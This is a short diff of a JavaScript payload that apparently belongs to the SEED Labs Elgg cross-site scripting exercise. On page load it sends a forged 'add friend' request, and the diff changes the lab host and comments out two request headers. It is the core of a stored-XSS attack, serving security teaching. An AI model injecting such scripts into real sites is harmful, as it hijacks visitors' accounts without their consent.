@@ -12,8 +12,8 @@ window.onload = function () {
   //Create and send Ajax request to add friend
   Ajax=new XMLHttpRequest();
   Ajax.open("GET",sendurl,true);
-  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
-  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  //Ajax.setRequestHeader("Host","www.seed-server.com");
+  //Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   Ajax.send();
 }
 </script>
